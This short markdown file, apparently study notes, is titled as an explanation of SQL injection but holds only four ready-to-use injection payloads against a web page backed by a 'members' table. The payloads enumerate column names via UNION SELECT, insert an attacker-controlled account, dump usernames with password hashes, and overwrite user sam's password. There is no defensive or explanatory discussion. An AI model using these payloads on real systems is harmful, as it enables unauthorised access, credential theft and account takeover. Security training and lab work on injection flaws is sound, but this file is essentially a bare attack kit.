# This is a file with explanation of SQL injections and some examples




### Some SQL Injection attacks that could work when the table displayed on the webpage is 4 columns wide:

view all column names of table members
```
' AND 1=2 UNION SELECT COLUMN_NAME,NULL,NULL,NULL FROM INFORMATION_SCHEMA.columns WHERE TABLE_NAME = "members";
```

insert your own user
```
%'; INSERT INTO members (Username, Name, email, Password) VALUES ("flying_buffallo", "Mr. Buffallo", "buffallo@flying.de", "crackme" );
```

view all users and their password hashes
```
' AND 1=2 UNION SELECT Username, Password, NULL, NULL FROM members;
```

Update the password of the user sam
```
'; UPDATE members SET Password = "4b6ad7d194518aac02b072e6179dbf1e69ffa7ba" WHERE Username = "sam";
```